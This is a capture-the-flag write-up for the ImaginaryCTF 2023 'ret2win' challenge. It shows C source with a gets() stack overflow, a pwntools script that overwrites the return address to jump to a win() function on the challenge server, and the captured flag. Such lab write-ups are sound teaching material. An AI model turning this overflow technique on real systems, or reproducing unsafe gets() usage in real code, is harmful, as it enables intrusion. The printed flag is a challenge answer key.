---
title: 2023 ImaginaryCTF - ret2win
author: allforest01
date: 2023-07-23 00:00:00 +0700
categories: [Write-ups, 2023imaginaryCTF]
tags: [pwn, write-ups]
---

## Description

> Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)

### Attached

[ret2win.c](https://imaginaryctf.org/r/73iLJ#vuln.c), [ret2win](https://imaginaryctf.org/r/BoCID#vuln)

```sh
nc ret2win.chal.imaginaryctf.org 1337
```

## Analyzation

Check the file attached

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}
```

```gets()``` is vuln, we can make a stack overflow

## Solution

By [allforest01](https://github.com/allforest01)

```python
from pwn import *
conn = remote('ret2win.chal.imaginaryctf.org', '1337')
print(conn.recv().decode())
conn.sendline(b'A' * 0x48 + p64(0x401182))
print(conn.recv().decode())
```

The flag is
```
ictf{r3turn_0f_th3_k1ng?}
```